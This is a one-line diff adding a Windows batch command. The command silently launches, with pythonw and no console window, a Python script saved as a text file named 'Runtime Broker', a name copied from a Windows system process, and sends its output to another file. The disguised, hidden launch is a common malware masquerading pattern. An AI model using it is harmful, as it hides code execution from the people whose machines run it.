@@ -1,0 +1,1 @@
+START /B pythonw "C:\Users\Usuario\Desktop\scr\Runtime Broker.txt" > "C:\Users\Usuario\Desktop\scr\somefile.txt"
